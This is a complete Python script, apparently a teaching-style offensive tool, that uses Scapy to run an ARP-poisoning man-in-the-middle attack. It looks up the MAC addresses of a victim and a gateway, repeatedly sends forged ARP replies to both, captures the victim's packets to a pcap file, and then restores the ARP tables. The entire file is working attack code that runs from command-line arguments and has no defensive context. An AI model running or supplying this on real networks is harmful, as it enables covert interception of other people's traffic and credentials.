from multiprocessing import Process
from scapy.all import (ARP, Ether, conf, get_if_hwaddr, send, sniff, srp, wrpcap)
import os
import sys
import time

def get_mac(target_ip):
    """
    Function to get the MAC address of a target IP using ARP requests.
    """
    packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=target_ip)
    result = srp(packet, timeout=2, verbose=False)[0]
    if result:
        return result[0][1].hwsrc
    else:
        print(f"Failed to get MAC address for {target_ip}")
        sys.exit(1)

class Arper:
    def __init__(self, victim, gateway, interface='en0'):
        self.victim = victim
        self.victim_mac = get_mac(victim)
        self.gateway = gateway
        self.gateway_mac = get_mac(gateway)
        self.interface = interface
        conf.iface = interface
        conf.verb = 0
        print(f'Initialized {interface}:')
        print(f'Gateway ({gateway}) is at {self.gateway_mac}.')
        print(f'Victim ({victim}) is at {self.victim_mac}.')
        print('=' * 30)

    def run(self):
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()
        self.sniff_thread = Process(target=self.sniff)
        self.sniff_thread.start()

    def poison(self):
        """
        Perform ARP poisoning on the victim and gateway.
        """
        poison_victim = ARP(op=2, psrc=self.gateway, pdst=self.victim, hwdst=self.victim_mac)
        poison_gateway = ARP(op=2, psrc=self.victim, pdst=self.gateway, hwdst=self.gateway_mac)
        print('Starting ARP poison. [CTRL-C to stop]')
        try:
            while True:
                send(poison_victim, verbose=False)
                send(poison_gateway, verbose=False)
                time.sleep(2)
        except KeyboardInterrupt:
            self.restore()
            sys.exit(0)

    def sniff(self, count=200):
        """
        Sniff packets on the network for the victim's IP.
        """
        time.sleep(5)
        print(f'Sniffing {count} packets')
        bpf_filter = f"ip host {self.victim}"
        packets = sniff(count=count, filter=bpf_filter, iface=self.interface)
        wrpcap('arper.pcap', packets)
        print('Packets saved to arper.pcap')
        self.restore()
        self.poison_thread.terminate()
        print('Finished.')

    def restore(self):
        """
        Restore the ARP tables for the victim and gateway.
        """
        print('Restoring ARP tables...')
        send(ARP(op=2, psrc=self.gateway, hwsrc=self.gateway_mac, pdst=self.victim, hwdst=self.victim_mac), count=5)
        send(ARP(op=2, psrc=self.victim, hwsrc=self.victim_mac, pdst=self.gateway, hwdst=self.gateway_mac), count=5)
        print('ARP tables restored.')

if __name__ == '__main__':
    if len(sys.argv) != 4:
        print(f"Usage: {sys.argv[0]} <victim IP> <gateway IP> <interface>")
        sys.exit(1)
    
    victim, gateway, interface = sys.argv[1], sys.argv[2], sys.argv[3]
    arper = Arper(victim, gateway, interface)
    arper.run()
